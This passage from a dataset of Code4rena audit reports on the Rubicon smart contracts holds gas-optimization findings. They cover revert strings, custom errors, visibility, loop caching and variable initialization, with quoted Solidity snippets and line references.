bonusTokens.length; index++) {\n\ncontracts/rubiconPools/BathPair.sol:\n 206:        last_stratTrade_id++;\n 311:        for (uint256 index = 0; index < array.length; index++) {\n 427:        for (uint256 index = 0; index < quantity; index++) {\n 480:        for (uint256 index = 0; index < quantity; index++) {\n 582:        for (uint256 index = 0; index < ids.length; index++) {\n```\n\n## Arithmetics: Use `!= 0` instead of `> 0` for unsigned integers\n`uint` will never go below 0. Thus, `> 0` is gas inefficient in comparisons as checking if `!= 0` is sufficient and costs less gas.\n\nConsider changing `> 0` to `!= 0` in these lines:  \n```js\ncontracts/RubiconRouter.sol:\n 354:        if (delta > 0) {\n\ncontracts/RubiconMarket.sol:\n 233:        return offers[id].timestamp > 0;\n 400:        require(pay_amt > 0);\n 402:        require(buy_amt > 0);\n 837:        while (pay_amt > 0) {\n 876:        while (buy_amt > 0) {\n 918:        if (pay_amt > 0) {\n 942:        if (buy_amt > 0) {\n 985:        require(id > 0);\n1002:        require(id > 0);\n1063:        while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n1099:        t_buy_amt > 0 &&\n1100:        t_pay_amt > 0 &&\n1175:        require(_span[pay_gem][buy_gem] > 0);\n1217:        while (uid > 0 && uid != id) {\n\ncontracts/peripheral_contracts/BathBuddy.sol:\n 102:        if (releasable > 0) {\n\ncontracts/rubiconPools/BathToken.sol:\n 634:        if (bonusTokens.length > 0) {\n\ncontracts/rubiconPools/BathHouse.sol:\n 111:        require(_reserveRatio > 0);\n 281:        require(rr > 0);\n\ncontracts/rubiconPools/BathPair.sol:\n 232:        if (askDelta > 0) {\n 252:        if (bidDelta > 0) {\n 333:        (askNumerator > 0 && askDenominator > 0) ||\n 334:        (bidNumerator > 0 && bidDenominator > 0),\n 515:        if (assetRebalAmt > 0) {\n 523:        if (quoteRebalAmt > 0) {\n 597:        if (fillCountA > 0) {\n 611:        if (fillCountQ > 0) {\n```\n\n## Visibility: Consider declaring constants as non-public to save gas\nIf a constant is not used outside of its contract, declaring it as `private` or `internal` instead of `public` can save gas.\n\nConsider changing the visibility of the following from `public` to `internal` or `private`:  \n```js\ncontracts/peripheral_contracts/TokenWithFaucet.sol:\n  16:        string public constant version = \"1\";\n```\n\n## Visibility: `public` functions can be set to `external`\nCalls to `external` functions are cheaper than `public` functions. Thus, if a function is not used internally in any contract, it should be set to `external` to save gas and improve code readability.\n\nConsider changing following functions from `public` to `external`:  \n```js\ncontracts/RubiconRouter.sol:\n  55:        function getBookFromPair(\n  56:            ERC20 asset,\n  57:            ERC20 quote,\n  58:            uint256 topNOrders\n  59:        )\n  60:            public\n  61:            view\n  62:            returns (\n  63:                uint256[3][] memory,\n  64:                uint256[3][] memory,\n  65:                uint256\n  66:            )\n  67:        {\n\n 129:        function getBestOfferAndInfo(address asset, address quote)\n 130:            public\n 131:            view\n 132:            returns (\n 133:                uint256, //id\n 134:                uint256,\n 135:                ERC20,\n 136:                uint256,\n 137:                ERC20\n 138:            )\n 139:        {\n\n 161:        function getExpectedSwapFill(\n 162:            uint256 pay_amt,\n 163:            uint256 buy_amt_min,\n 164:            address[] calldata route, // First address is what is being payed, Last address is what is being bought\n 165:            uint256 expectedMarketFeeBPS //20\n 166:        ) public view returns (uint256 fill_amt) {\n\n 194:        function swap(\n 195:            uint256 pay_amt,\n 196:            uint256 buy_amt_min,\n 197:            address[] calldata route, // First address is what is being payed, Last address is what is being bought\n 198:            uint256 expectedMarketFeeBPS //20\n 199:        ) public returns (uint256) {\n\ncontracts/peripheral_contracts/BathBuddy.sol:\n  81:        function released(address token) public view returns (uint256) {\n\ncontracts/rubiconPools/BathToken.sol:\n 383:        function asset() public view returns (address assetTokenAddress) {\n\n 416:        function maxDeposit(address receiver)\n 417:            public\n 418:            pure\n 419:            returns (uint256 maxAssets)\n 420:        {\n\n 425:        function previewDeposit(uint256 assets)\n 426:            public\n 427:            view\n 428:            returns (uint256 shares)\n 429:        {\n\n 441:        function deposit(uint256 assets, address receiver)\n 442:            public\n 443:            returns (uint256 shares)\n 444:        {\n\n 450:        function maxMint(address receiver) public pure returns (uint256 maxShares) {\n\n 464:        function mint(uint256 shares, address receiver)\n 465:            public\n 466:            returns (uint256 assets)\n 467:        {\n\n 475:        function maxWithdraw(address owner)\n 476:            public\n 477:            view\n 478:            returns (uint256 maxAssets)\n 479:        {\n\n 505:        function withdraw(\n 506:            uint256 assets,\n 507:            address receiver,\n 508:            address owner\n 509:        ) public returns (uint256 shares) {\n\n 525:        function maxRedeem(address owner) public view returns (uint256 maxShares) {\n\n 531:        function previewRedeem(uint256 shares)\n 532:            public\n 533:            view\n 534:            returns (uint256 assets)\n 535:        {\n\n 542:        function redeem(\n 543:            uint256 shares,\n 544:            address receiver,\n 545:            address owner\n 546:        ) public returns (uint256 assets) {\n\ncontracts/rubiconPools/BathHouse.sol:\n 359:        function getBPSToStrats() public view returns (uint8) {\n 382:        function isApprovedPair(address pair) public view returns (bool outcome) {\n\ncontracts/rubiconPools/BathPair.sol:\n 631:        function getOutstandingStrategistTrades(\n 632:            address asset,\n 633:            address quote,\n 634:            address strategist\n 635:        ) public view returns (uint256[] memory) {\n```\n\n## Errors: Reduce the length of error messages (long revert strings)\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional `mstore`, along with additional overhead for computing memory offset, etc.\n\nIn these instances, consider shortening the revert strings to fit within 32 bytes, or using custom errors:    \n```js\ncontracts/RubiconMarket.sol:\n 571:        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n\ncontracts/peripheral_contracts/ERC20.sol:\n 269:        require(sender != address(0), \"ERC20: transfer from the zero address\");\n 270:        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n 313:        require(account != address(0), \"ERC20: burn from the zero address\");\n 343:        require(owner != address(0), \"ERC20: approve from the zero address\");\n 344:        require(spender != address(0), \"ERC20: approve to the zero address\");\n\ncontracts/rubiconPools/BathToken.sol:\n 470:        require(_shares == shares, \"did not mint expected share count\");\n\ncontracts/rubiconPools/BathPair.sol:\n 318:        require(assigned, \"Didnt Find that element in live list, cannot scrub\");\n\ncontracts/proxy/Address.sol:\n 188:        require(isContract(target), \"Address: static call to non-contract\");\n 224:        require(isContract(target), \"Address: delegate call to non-contract\");\n```\n\n## Errors: Use custom errors instead of revert strings\nSince Solidity v0.8.4, custom errors should be used instead of revert strings due to:\n* Cheaper deployment cost\n* Lower runtime cost upon revert\n\nTaken from [Custom Errors in Solidity](https://blog.soliditylang.org/2021/04/21/custom-errors/):\n> Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors can be defined using of the `error` statement, both inside or outside of contracts.\n\nInstances where custom errors can be used instead:  \n```js\ncontracts/RubiconRouter.sol:\n 185:        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n 247:        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n 461:        require(target == ERC20(wethAddress), \"target pool not weth pool\");\n 462:        require(msg.value >= amount, \"didnt send enough eth\");\n 481:        require(target == ERC20(wethAddress), \"target pool not weth pool\");\n 500:        require(route[0] == wethAddress, \"Initial value in path not WETH\");\n\ncontracts/RubiconMarket.sol:\n  28:        require(isAuthorized(msg.sender), \"ds-auth-unauthorized\");\n  46:        require((z = x + y) >= x, \"ds-math-add-overflow\");\n  50:        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n  54:        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n 282:        require(uint128(spend) == spend, \"spend is not an int\");\n 283:        require(uint128(quantity) == quantity, \"quantity is not an int\");\n 552:        require(!initialized, \"contract is already initialized\");\n 571:        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n 618:        require(!locked, \"Reentrancy attempt\");\n 645:        require(!locked, \"Reentrancy attempt\");\n 661:        require(!locked, \"Reentrancy attempt\");\n 684:        require(!locked, \"Reentrancy attempt\");\n 701:        require(!locked, \"Reentrancy attempt\");\n 714:        require(!locked, \"Reentrancy attempt\");\n 835:        require(!locked, \"Reentrancy attempt\");\n 874:        require(!locked, \"Reentrancy attempt\");\n\ncontracts/peripheral_contracts/WETH9.sol:\n  74:        require(balanceOf[src] >= wad, \"balance check failed\");\n\ncontracts/peripheral_contracts/SafeMathE.sol:\n   9:        require((z = x + y) >= x, \"ds-math-add-overflow\");\n  13:        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n  17:        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n\ncontracts/peripheral_contracts/ERC20.sol:\n 269:        require(sender != address(0), \"ERC20: transfer from the zero address\");\n 270:        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n 292:        require(account != address(0), \"ERC20: mint to the zero address\");\n 313:        require(account != address(0), \"ERC20: burn from the zero address\");\n 343:        require(owner != address(0), \"ERC20: approve from the zero address\");\n 344:        require(spender != address(0), \"ERC20: approve to the zero address\");\n\ncontracts/rubiconPools/BathToken.sol:\n 470:        require(_shares == shares, \"did not mint expected share count\");\n 722:        require(deadline >= block.timestamp, \"bathToken: EXPIRED\");\n\ncontracts/rubiconPools/BathHouse.sol:\n 395:        require(initialized, \"BathHouse not initialized\");\n\ncontracts/rubiconPools/BathPair.sol:\n 318:        require(assigned, \"Didnt Find that element in live list, cannot scrub\");\n\ncontracts/proxy/Address.sol:\n 149:        require(isContract(target), \"Address: call to non-contract\");\n 188:        require(isContract(target), \"Address: static call to non-contract\");\n 224:        require(isContract(target), \"Address: delegate call to non-contract\");\n```\n\n## Unecessary initialization of variables with default values\nUninitialized variables are assigned with a default value depending on its type:\n* `uint`: `0`\n* `bool`: `false`\n* `address`: `address(0)`\n\nThus, explicitly initializing a variable with its default value costs unnecesary gas. For example, the following code:\n```js\nbool b = false;\naddress c = address(0);\nuint256 a = 0;\nfor (uint256 i = 0; i < length; ++i) {\n```\ncan be changed to:\n```js\nuint256 a;\nbool b;\naddress c;\nfor (uint256 i; i < length; ++i) {\n```\n\nConsider declaring the following lines without explicitly setting a value:  \n```js\ncontracts/RubiconRouter.sol:\n  82:        uint256 lastBid = 0;\n  83:        uint256 lastAsk = 0;\n 168:        uint256 currentAmount = 0;\n 226:        uint256 currentAmount = 0;\n\ncontracts/RubiconMarket.sol:\n 990:        uint256 old_top = 0;\n\ncontracts/rubiconPools/BathPair.sol:\n 310:        bool assigned = false;\n```\n\n## Unnecessary definition of variables\nSome variables are defined even though they are only used once in their respective functions. Not defining these variables can help to reduce gas cost and contract size.\n\nInstances include:  \n```js\ncontracts/RubiconRouter.sol:\n 167:        address _market = RubiconMarketAddress;\n 170:        (address input, address output)\n 228:        (address input, address output)\n\ncontracts/RubiconMarket.sol:\n 987:        address buy_gem = address(offers[id].buy_gem);\n 988:        address pay_gem = address(offers[id].pay_gem);\n\ncontracts/rubiconPools/BathToken.sol:\n 483:        uint256 ownerShares = balanceOf[owner];\n\ncontracts/rubiconPools/BathPair.sol:\n 425:        uint256 quantity = askNumerators.length;\n 478:        uint256 quantity = askNumerators.length;\n 583:        uint256 _id = ids[index];\n```\n\n\n## Storage variables should be declared `immutable` when possible\nIf a storage variable is assigned only in the constructor, it should be declared as `immutable`. This would help to reduce gas costs as calls to `immutable` variables are much cheaper than regular state variables, as seen from the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constant-and-immutable-state-variables):\n> Compared to regular state variables, the gas costs of constant and immutable variables are much lower. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed.\n\nConsider declaring these variables as `immutable`:  \n```js\ncontracts/peripheral_contracts/BathBuddy.sol:\n  31:        address public beneficiary;\n  32:        uint64 public start;\n  33:        uint64 public duration;\n```\n\n## Boolean comparisons\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the boolean value.\n\nConsidering changing the following lines from `var == true` to `var`, or `var == false` to `!var`:\n```js\ncontracts/rubiconPools/BathToken.sol:\n 228:        IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n\ncontracts/rubiconPools/BathPair.sol:\n 149:        IBathHouse(bathHouse).isApprovedStrategist(targetStrategist) ==\n 150:            true,\n\ncontracts/rubiconPools/BathHouse.sol:\n 372:        approvedStrategists[wouldBeStrategist] == true ||\n```\n\n## Variables declared as `constant` are expressions, not constants\nDue to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.\n\nIf the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.\n\nSee: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232):\n> Consequences: each usage of a “constant” costs ~100 gas more on each access (it is still a little better than storing the result in storage, but not much). since these are not real constants, they can’t be referenced from a real constant environment (e.g. from assembly, or from another library)\n\n```js\ncontracts/RubiconMarket.sol:\n  73:        uint256 constant WAD = 10**18;\n  74:        uint256 constant RAY = 10**27;\n```\n\nChange these expressions from `constant` to `immutable` and implement the calculation in the constructor. Alternatively, hardcode these values in the constants and add a comment to say how the value was calculated.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/421"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## FINDINGS\n\n## Use Short revert strings\nWe always need to use strings along with our require statements to explain why an error happened. These strings, however, take space in the deployed bytecode. Every reason string takes at least 32 bytes so make sure your string fits in 32 bytes or it will become more expensive.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore along with an additional overhead for computing memory offset. Having a short one will decrease deployment gas and decrease the runtime gas when the revert condition is met\n\nFile: RubiconMarket.sol: [line 571](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L571)\n\nFile: RubiconMarket.sol: [line 572](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L572)\n```\n// After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() || msg.sender == getOwner(id) || id == dustId,\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n```\n\nFile: RubiconMarket.sol: [line 304](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L304),\n\nFile: RubiconMarket.sol: [line 308](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L308)\n\nFile: RubiconRouter.sol: [line 336](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L336)\n\nFile: RubiconRouter.sol: [line 390](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L390)\n\nFile: RubiconRouter.sol: [line 444](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L444)\n\nFile: RubiconRouter.sol: [line 504](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L504)\n\nFile: BathHouse.sol: [line 143](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L143)\n\nFile: BathHouse.sol: [line 147](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L147)\n\nFile: BathHouse.sol: [line 156](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L156)\n\nFile: BathHouse.sol: [line 171](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L171)\n\nFile: BathHouse.sol: [line 397](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L397)\n\nFile: BathPair.sol: [line 148](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L148)\n\nFile: BathPair.sol: [line 174](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L174)\n\nFile: BathPair.sol: [line 182](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L182)\n\nFile: BathPair.sol: [line 318](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L318)\n\nFile: BathPair.sol: [line 570](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L570)\n\nFile: BathToken.sol [line 227](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L227)\n\nFile: BathToken.sol [line 470](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L470)\n\nFile: BathToken.sol [line 510](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L510)\n\nFile: BathToken.sol [line 516](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L516)\n\nFile: BathToken.sol [line 547](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L547)\n\nBathBuddy.sol [line 43](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L43)\n\nBathBuddy.sol [line 94](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L94)\n\n## Split require statement using && which saves us around 8 gas\nInstead of using the && operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 3 GAS per &&:\n\nFile: RubiconMarket.sol: [line 715](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L715)\n\nFile: RubiconMarket.sol: [line 1177](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L1177)\n\nFile: BathPair.sol [line 120](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L120)\n\nFile: BathPair.sol [line 332](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L332)\n\nFile: BathPair.sol [line 346](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L346)\n\nFile: BathPair.sol [line 419](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L419)\n\nFile: BathPair.sol [line 471](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L471)\n\nFile: BathPair.sol [line 506](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L506)\n\nFile: BathToken.sol [line 740](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L740)\n\n## Use != 0 instead of > 0 for unsigned integer comparison\nWhen dealing with unsigned integer types, comparisons with != 0 are cheaper than with > 0  as we can save 3 gas (id is uint so it will never be less than 0, so this check only needs to ensure that id is not equal to 0)\n\nFile: RubiconMarket.sol: [line 983](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L983-L985)\n```\n    //find the id of the next higher offer after offers[id]\n    function _find(uint256 id) internal view returns (uint256) {\n        require(id > 0);\n```\nRubiconMarket.sol:  [line 837](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L837) \n  \nFile: RubiconMarket.sol: [line 876](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L876)\n\nFile: RubiconMarket.sol: [line 985](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L985)\n\nFile: BathPair.sol: [line 515](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L515)\n\nFile: BathPair.sol: [line 597](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L597)\n\nFile: BathPair.sol: [line 611](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L611)\n\nFile: BathBuddy.sol: [line 102](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L102)\n\n\n## No need to initialize variables with their defaults.\n\nIf a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address and so on). Explicitly initializing it with its default value is an anti-pattern and wastes gas as It costs more gas to initialize variables to zero than to let the default of zero be applied\n\nRubiconMarket.sol: [line 990](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L990)\n\n```\n  uint256 old_top = 0;\n```\n\nFile: BathPair.sol  [line 310](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L310)\n\n ```\n bool assigned = false;\n```\n\n## Use short circuit \nThe operators “||” and “&&” apply the common short-circuiting rules. This means that in the expression “f(x) || g(y)”, if “f(x)” evaluates to true, “g(y)” will not be evaluated even if it may have side-effects. So setting less costly function to “f(x)” and setting costly function to “g(x)” is efficient.\n\nFile: rubiconmarket.sol  [line 32](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L32-L40)\n\n```\n    function isAuthorized(address src) internal view returns (bool) {\n        if (src == address(this)) {\n            return true;\n        } else if (src == owner) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n```\nThe above can be rewritten as follows , which would cost us  around 14 gas less.\n\n```\n    function isAuthorized(address src) internal view returns (bool) {\n        if (src == owner || src == address(this) ) {\n            return true;\n    \n        } else {\n            return false;\n        }\n    }\n```\n \n### Commented code\n\nFile: RubiconMarket.sol [line 93-110](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L93-L110)\n```\n// /// @notice ERC-20 interface as derived from EIP-20\n// contract ERC20 {\n//     function totalSupply() public view returns (uint256);\n\n\n//     function balanceOf(address guy) public view returns (uint256);\n\n\n//     function allowance(address src, address guy) public view returns (uint256);\n\n\n//     function approve(address guy, uint256 wad) public returns (bool);\n\n\n//     function transfer(address dst, uint256 wad) public returns (bool);\n\n\n//     function transferFrom(\n//         address src,\n//         address dst,\n//         uint256 wad\n//     ) public returns (bool);\n// }\n```\n\nThis piece of code should be deleted as it serves no purpose\n\n## Emit memory variable not storage\nFile: RubiconMarket.sol [line 747](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L747-L751)\n```\n    function setBuyEnabled(bool buyEnabled_) external auth returns (bool) {\n        buyEnabled = buyEnabled_;\n        emit LogBuyEnabled(buyEnabled);\n        return true;\n    }\n```\nWe seem to be emmiting a storage variable rather than the cached one which is **buyEnabled_**\n\nRubiconMarket.sol [line 760](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L760-L768)\n\n```\n    function setMatchingEnabled(bool matchingEnabled_)\n        external\n        auth\n        returns (bool)\n    {\n        matchingEnabled = matchingEnabled_;\n        emit LogMatchingEnabled(matchingEnabled);\n        return true;\n    }\n```\nIn the above, we should change the code to emit  **matchingEnabled_**\n\n## Cache storage in memory to minimize number of SLOADs\n\nFile: Bathtoken.sol [line 278](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L278-L291)\n```\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n```\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, storage values should get cached in memory\nCache the **outstandingAmount** and **totalSupply**, don't work with storage values.\nState variables should be cached in stack variables rather than re-reading them from storage\n\n**Other instances**\n\nIn the following instances, **outstandingAmount and totalSupply** should be cached as they are read several times. \n\nFile: Bathtoken.sol [line 294](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L294-L303)\n\nFile: Bathtoken.sol [line 306](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L306-L341)\n\nFile: Bathtoken.sol [line 346](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L346-L369)\n\nFile: Bathtoken.sol [line 557](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L585)\n\n### Caching the length in for loops\nReading array length at each iteration of the loop takes 6 gas in the stack\nThe solidity compiler will always read the length of the array during each iteration.\n\nBathpair.sol  [line 303](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L303-L319)\n\n```\n    /// @notice A function that returns the index of uid from array\n    /// @dev uid must be in array for the purposes of this contract to enforce outstanding trades per strategist are tracked correctly\n    function getIndexFromElement(uint256 uid, uint256[] storage array)\n        internal\n        view\n        returns (uint256 _index)\n    {\n        bool assigned = false;\n        for (uint256 index = 0; index < array.length; index++) {\n            if (uid == array[index]) {\n                _index = index;\n                assigned = true;\n                return _index;\n            }\n        }\n        require(assigned, \"Didnt Find that element in live list, cannot scrub\");\n    }\n```\nIn the above case, the solidity compiler will always read the length of the array during each iteration and since the following is  a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929) for each iteration except for the first),\n\nThis extra costs can be avoided by caching the array length (in stack) as follows.\n\n```\nuint length = array.length;\nfor (uint i = 0; i < length; i++) {\n    // do something that doesn't change arr.length\n}\n```\n\n**Other instances:**\n\nFile: Bathtoken.sol [line 627](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L627-L653)\n\n```\n /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers\n    /// @dev Note that bonusTokens adhere to the same feeTo and feeBPS pattern. Fees sit on BathBuddy to act as effectively accrued to the pool.\n    function distributeBonusTokenRewards(\n        address receiver,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply\n    ) internal {\n        if (bonusTokens.length > 0) {\n            for (uint256 index = 0; index < bonusTokens.length; index++) {\n                IERC20 token = IERC20(bonusTokens[index]);\n                // Note: Shares already burned in Bath Token _withdraw\n\n                // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n                //  are released their relative share of this pool, of vested BathBuddy rewards\n                // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n                if (rewardsVestingWallet != IBathBuddy(0)) {\n                    rewardsVestingWallet.release(\n                        (token),\n                        receiver,\n                        sharesWithdrawn,\n                        initialTotalSupply,\n                        